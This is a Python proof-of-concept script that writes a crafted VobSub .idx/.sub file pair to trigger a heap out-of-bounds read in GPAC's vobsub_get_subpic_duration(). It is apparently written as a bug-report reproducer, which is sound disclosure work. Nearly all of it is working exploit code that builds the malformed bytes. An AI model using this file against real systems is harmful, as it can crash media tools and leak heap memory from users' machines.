#!/usr/bin/env python3
"""
Minimal reproducer for VobSub heap-buffer-overflow in vobsub_get_subpic_duration().

Bug location: src/media_tools/vobsub.c:493
  vobsub_get_subpic_duration() reads data[dsize..dsize+3] without checking dsize+3 < psize.
  When dsize >= psize-3, this reads 1-4 bytes past the heap buffer.

Triggered by: gpac -i test.idx inspect:full
              MP4Box -info test.idx

ASAN output confirms:
  ERROR: AddressSanitizer: heap-buffer-overflow on address ...
  READ of size 1 at ... thread T0
  #0 ... in vobsub_get_subpic_duration media_tools/vobsub.c:493

CWE-125: Out-of-bounds Read
Impact: Information disclosure (leaks heap memory), potential crash
"""
import os
import sys

def create_minimal_vobsub(out_dir):
    """Create the smallest possible .idx + .sub pair that triggers the bug."""
    os.makedirs(out_dir, exist_ok=True)

    # Minimal .idx file
    idx_content = (
        "# VobSub index file, v7\n"
        "size: 720x480\n"
        "palette: 000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,"
        "000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff\n"
        "id: en, index: 0\n"
        "timestamp: 00:00:01:000, filepos: 000000000\n"
    )

    with open(os.path.join(out_dir, "test.idx"), 'w') as f:
        f.write(idx_content)

    # Minimal .sub file (MPEG-PS Private Stream 1 packet)
    buf = bytearray(0x800)

    # --- MPEG-2 Pack Header (14 bytes) ---
    buf[0x00:0x04] = b'\x00\x00\x01\xBA'  # pack_start_code
    buf[0x04] = 0x44                        # '01' marker + SCR base
    buf[0x05:0x0E] = b'\x00\x04\x00\x04\x01\x01\x89\xC3\xF8'

    # --- PES Header for Private Stream 1 ---
    buf[0x0E:0x12] = b'\x00\x00\x01\xBD'   # start code + stream_id=0xBD

    # PES packet length (enough for our small subpicture)
    pes_pkt_len = 50
    buf[0x12] = (pes_pkt_len >> 8) & 0xFF
    buf[0x13] = pes_pkt_len & 0xFF

    # PES extension
    buf[0x14] = 0x80    # MPEG-2 PES
    buf[0x15] = 0x80    # PTS flag
    buf[0x16] = 5       # PES header data length (PTS = 5 bytes)

    # PTS bytes (timestamp = 90000 = 1 second)
    pts = 90000
    buf[0x17] = 0x21 | ((pts >> 29) & 0x0E)
    buf[0x18] = (pts >> 22) & 0xFF
    buf[0x19] = 0x01 | ((pts >> 14) & 0xFE)
    buf[0x1A] = (pts >> 7) & 0xFF
    buf[0x1B] = 0x01 | ((pts << 1) & 0xFE)

    pes_hdr_len = buf[0x16]  # = 5

    # Substream ID: must be 0x20 (first subtitle track)
    # Located at buf[pes_hdr_len + 0x17] = buf[0x1C]
    buf[pes_hdr_len + 0x17] = 0x20

    # --- Trigger the bug ---
    # psize at buf[pes_hdr_len + 0x18..0x19]
    # dsize at buf[pes_hdr_len + 0x1a..0x1b]
    #
    # Set psize=10, dsize=10.
    # vobsub_get_subpic_duration(data, 10, 10, &dur) will read data[10..13]
    # which is 4 bytes past the 10-byte allocation.
    psize = 10
    dsize = 10  # dsize >= psize triggers OOB read

    buf[pes_hdr_len + 0x18] = (psize >> 8) & 0xFF
    buf[pes_hdr_len + 0x19] = psize & 0xFF
    buf[pes_hdr_len + 0x1A] = (dsize >> 8) & 0xFF
    buf[pes_hdr_len + 0x1B] = dsize & 0xFF

    with open(os.path.join(out_dir, "test.sub"), 'wb') as f:
        f.write(buf)

    print(f"Minimal VobSub PoC written to {out_dir}/")
    print(f"  psize={psize}, dsize={dsize}")
    print(f"  Reads data[{dsize}..{dsize+3}] from a {psize}-byte buffer")
    print()
    print("Reproduce with:")
    print(f"  gpac -i {out_dir}/test.idx inspect:full")
    print(f"  # or: MP4Box -info {out_dir}/test.idx")


if __name__ == "__main__":
    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vobsub_oob_minimal")
    create_minimal_vobsub(out_dir)
